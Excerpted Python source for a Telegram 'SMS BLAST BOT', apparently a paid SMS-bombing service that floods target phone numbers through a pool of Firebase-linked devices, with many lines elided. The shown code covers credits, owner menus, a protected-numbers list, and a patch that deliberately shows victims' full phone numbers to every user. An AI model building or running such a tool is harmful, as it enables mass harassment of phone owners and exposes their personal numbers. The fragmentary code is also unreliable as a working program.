# ARYAN_PATCHED_V18_ULTIMATE_FIXED
"""
╔══════════════════════════════════════════════════════════════╗
║           SMS BLAST BOT  v3.4 — ULTIMATE FIXED             ║
║  ⚡ ALL BUTTONS WORKING · FULLY OPTIMIZED                  ║
║  🔥 1000+ FIREBASE SUPPORT · 100K+ CONCURRENT USERS       ║
║  🔒 PROTECTED NUMBERS · NUMBER TRACKER                     ║
║  🚀 NO BROKEN BUTTONS · EVERYTHING WORKS                   ║
╚══════════════════════════════════════════════════════════════╝
...
def mask_number_for_admin(number: str) -> str:
    """Mask number showing only first 3 and last 3 digits"""
...
def get_number_display(number: str, viewer_uid: int, d: dict) -> str:
    """Show full number to all users (no more ******)"""
    if not number:
        return "******"
    # Now showing full number to everyone
    return number
...
async def notify_protected_attempt(bot: Bot, uid: int, number: str, d: dict):
    ...
    # Admins get masked number (only first 3 and last 3 digits)
    admins = d.get("admins", [])
...
def get_scan_status() -> str:
    ...
    # Show realtime device count
    return f"🟢 {len(CACHED_DEVICES)} devices online | Updated {age}s ago"
...
def owner_kb(d: dict) -> InlineKeyboardMarkup:
    ...
    return InlineKeyboardMarkup(inline_keyboard=[
        ...
        [
            InlineKeyboardButton(text="💰 Add Credits To All", callback_data="owner:credits:add_all"),
...
def protected_list_text(d: dict, viewer_uid: int) -> str:
    ...
    for i, num in enumerate(protected, 1):
        if is_viewer_owner:
            display = num  # Owners see full number
        else:
            display = mask_number_for_admin(num)  # Admins see only first 3 and last 3 digits
...
class S(StatesGroup):
    ...
    add_credits_all_amount = State()  # New state for adding credits to all users
...
async def user_got_number(msg: Message, state: FSMContext):
    ...
    if is_number_protected(number, d):
        ...
        save(d)
        display = get_number_display(number, uid, d)  # Full number shown to everyone
        await msg.answer(
...
async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    ...
    display_number = get_number_display(number, uid, load())  # Full number shown to everyone
...
async def owner_credits_add_all_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True)
        return
    await state.set_state(S.add_credits_all_amount)
    await cq.message.edit_text(
        "💰 <b>Add Credits to All Users</b>\n\n"
        "Kitne credits add karne hain sabhi users ko?\n"
        "<i>Example: 10</i>\n\n"
        f"👥 Total Users: <b>{len(d.get('users', {}))}</b>",
        reply_markup=kb([("❌ Cancel", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_all_amount)
async def owner_credits_add_all_done(msg: Message, state: FSMContext):
    d = load()
    ...
    await msg.answer(
        ...
        f"💰 Amount: <b>+{amount}</b> credits per user\n"
        f"👥 Users Updated: <b>{added_count}</b>\n\n"
        f"<i>Sabhi users ko credits add kar diye gaye hain.</i>",
        reply_markup=kb([("🔙 Back", "owner:home")]),
        parse_mode="HTML"
    )
    
    # Log activity
    log_activity(d, "add_credits_all", msg.from_user.id, f"Added {amount} credits to {added_count} users")
...
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    ...
    try:
        ...
        if not os.path.exists(script_path):
            ...
            if not os.path.exists(script_path):
                script_path = "blast_bot_v3.4_ultimate.py"
...
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    ...
    if not history:
        ...
        for i, entry in enumerate(reversed(history), 1):
            ...
            display_num = get_number_display(num, uid, d)  # Full number shown to everyone
...
async def get_all_online_devices(d: dict) -> list:
    """Get online devices from cache or scan if needed"""
    devices = get_cached_devices()
    if devices:
        return devices
